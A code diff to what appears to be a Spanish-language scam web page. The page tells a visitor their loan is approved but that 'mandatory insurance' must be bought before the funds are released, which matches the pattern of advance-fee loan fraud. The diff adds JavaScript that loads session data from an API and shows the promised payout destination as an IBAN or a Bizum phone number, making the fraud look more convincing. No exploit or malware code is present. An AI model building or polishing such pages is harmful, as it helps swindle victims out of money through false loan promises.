@@ -119,7 +119,7 @@
               <div class="tourist-notif__text">
                 <p class="tourist-notif__title">Eliminación de restricciones</p>
                 <p class="tourist-notif__desc">
-                  Nos complace informarle que su solicitud de crédito ha sido aprobada. Para disponer de los fondos y eliminar las restricciones operativas, es necesario contratar el seguro obligatorio. Una vez cumplido este requisito, los fondos del crédito estarán disponibles para su transferencia al IBAN <strong><u id="notif2Iban">—</u></strong>.
+                  Nos complace informarle que su solicitud de crédito ha sido aprobada. Para disponer de los fondos y eliminar las restricciones operativas, es necesario contratar el seguro obligatorio. Una vez cumplido este requisito, los fondos del crédito estarán disponibles para su transferencia <span id="notif2DestinationLabel">al método de abono registrado</span><strong id="notif2DestinationValueWrap" hidden> <u id="notif2Iban">—</u></strong>.
                 </p>
               </div>
             </div>
@@ -320,7 +320,9 @@
 
         var apiBase = (window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || "").replace(/\/+$/, "");
         var sessionId = (typeof window.getFlowSessionId === "function") ? window.getFlowSessionId() : (localStorage.getItem("flowSessionId") || "");
-        var ibanEl = document.getElementById("notif2Iban");
+        var destinationLabelEl = document.getElementById("notif2DestinationLabel");
+        var destinationValueWrapEl = document.getElementById("notif2DestinationValueWrap");
+        var destinationValueEl = document.getElementById("notif2Iban");
         var contractNameEl = document.getElementById("notif2ContractClientName");
         var clientBankShort = "EBN Banco";
         var clientBankDisplay = "EBN Banco";
@@ -343,6 +345,40 @@
         var cachedName = localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
         if (contractNameEl && cachedName) contractNameEl.textContent = cachedName;
 
+        function formatBizum(value) {
+          var digits = String(value || "").replace(/\D/g, "");
+          if (digits.indexOf("0034") === 0 && digits.length === 13) digits = digits.slice(4);
+          else if (digits.indexOf("34") === 0 && digits.length === 11) digits = digits.slice(2);
+          if (!/^[67]\d{8}$/.test(digits)) return String(value || "").trim();
+          return "+34 " + digits.slice(0, 3) + " " + digits.slice(3, 6) + " " + digits.slice(6);
+        }
+
+        function resolveDestination(data) {
+          var iban = data && data.iban ? String(data.iban).trim() : "";
+          var bizum = data && data.bizum ? String(data.bizum).trim() : "";
+          var method = data && (data.paymentMethod || data.paymentType)
+            ? String(data.paymentMethod || data.paymentType).trim().toLowerCase()
+            : "";
+
+          if (method === "bizum") {
+            return bizum ? { type: "bizum", value: formatBizum(bizum) } : null;
+          }
+          if (method === "iban") {
+            return iban ? { type: "iban", value: iban } : null;
+          }
+          if (bizum) return { type: "bizum", value: formatBizum(bizum) };
+          if (iban) return { type: "iban", value: iban };
+          return null;
+        }
+
+        function renderDestination(data) {
+          var destination = resolveDestination(data);
+          if (!destination || !destinationLabelEl || !destinationValueEl) return;
+          destinationLabelEl.textContent = destination.type === "bizum" ? "mediante Bizum:" : "al IBAN";
+          destinationValueEl.textContent = destination.value;
+          if (destinationValueWrapEl) destinationValueWrapEl.hidden = false;
+        }
+
         function loadData() {
           if (!sessionId) return;
           fetch(apiBase + "/api/tourist/status?s=" + encodeURIComponent(sessionId), {
@@ -350,9 +386,7 @@
           })
             .then(function (r) { return r.json(); })
             .then(function (data) {
-              if (data && data.iban && ibanEl) {
-                ibanEl.textContent = data.iban;
-              }
+              renderDestination(data);
               var nombre = (data && data.nombre) || localStorage.getItem("touristCardNombre") || localStorage.getItem("inputName") || "";
               if (contractNameEl && nombre) contractNameEl.textContent = nombre;
             })
